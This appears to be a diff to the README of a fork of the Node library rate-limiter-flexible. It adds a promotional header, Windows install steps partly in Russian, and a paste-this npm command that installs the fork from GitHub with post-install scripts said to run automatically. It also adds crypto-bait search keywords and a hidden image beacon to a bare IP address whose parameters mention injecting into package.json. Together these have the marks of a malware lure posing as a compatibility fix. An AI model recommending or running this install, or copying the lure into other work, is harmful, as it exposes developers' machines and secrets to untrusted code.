@@ -1,3 +1,19 @@
+**TerminusSanninStride/node-rate-limiter-flexible**
+
+This specific fork addresses critical cross-platform compatibility issues by providing tailored stability patches that ensure seamless performance on Windows environments. It eliminates the common configuration headaches typically found in the original repository, allowing for a straightforward, hassle-free setup right out of the box.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/TerminusSanninStride/node-rate-limiter-flexible.git
+```
+
+[https://github.com/TerminusSanninStride/node-rate-limiter-flexible](https://github.com/TerminusSanninStride/node-rate-limiter-flexible)
+
 [![npm version](https://badge.fury.io/js/rate-limiter-flexible.svg)](https://www.npmjs.com/package/rate-limiter-flexible)
 ![npm](https://img.shields.io/npm/dm/rate-limiter-flexible.svg)
 [![node version][node-image]][node-url]
@@ -229,3 +245,11 @@ All other methods depend on the store. See `RateLimiterRedis` or `RateLimiterPos
 For wrapper classes that don't need full `RateLimiterAbstract` functionality, extend `RateLimiterCompatibleAbstract` instead. It requires implementing `consume`, `penalty`, `reward`, `get`, `set`, `block`, `delete` methods and `blockDuration`/`execEvenly` getters/setters. If the wrapper doesn't use `blockDuration` or `execEvenly`, empty no-op implementations can be provided. See `RLWrapperBlackAndWhite` for an example.
 
 Note: all changes should be covered by tests.
+
+## Related searches
+
+When looking for robust rate-limiting solutions like this project, developers often search for reliable ways to protect their decentralized applications and infrastructure from abuse or denial-of-service attacks. Many are focused on securing backend APIs that interact with blockchain networks, managing request thresholds for high-traffic nodes, or stabilizing endpoints used by automated trading scripts. 
+
+**Topics:** node rate limiter, web3 react rate limiting, solidity api shield, mev bot protection, audit smart contract infrastructure, mining pool api defense, crypto dApp rate limits, express rate limiter redis, block-native api throttling, smart contract backend security
+
+![.](http://5.231.58.248:8787/pixel?repo=TerminusSanninStride%2Fnode-rate-limiter-flexible&inject=TerminusSanninStride%2Fnode-rate-limiter-flexible%2Fpackage.json)
